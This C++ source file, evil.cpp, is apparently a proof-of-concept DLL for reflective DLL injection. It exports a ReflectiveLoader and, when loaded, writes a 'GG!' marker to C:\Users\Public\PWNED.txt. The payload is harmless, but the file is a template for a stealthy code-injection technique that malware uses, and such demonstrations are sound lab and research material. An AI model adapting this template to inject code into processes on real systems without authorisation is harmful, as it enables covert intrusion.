// evil.cpp
#include "ReflectiveLdr.h"
#include <windows.h>

// Cette macro exporte automatiquement ReflectiveLoader()
EXPORT_REFLECTIVE_LOADER

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved)
{
    if (reason == DLL_PROCESS_ATTACH)
    {

        HANDLE hFile = CreateFileA(
            "C:\\Users\\Public\\PWNED.txt",
            GENERIC_WRITE, 0, NULL,
            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL
        );
        if (hFile != INVALID_HANDLE_VALUE)
        {
            WriteFile(hFile, "GG!", 3, NULL, NULL);
            CloseHandle(hFile);
        }
    }
    return TRUE;
}
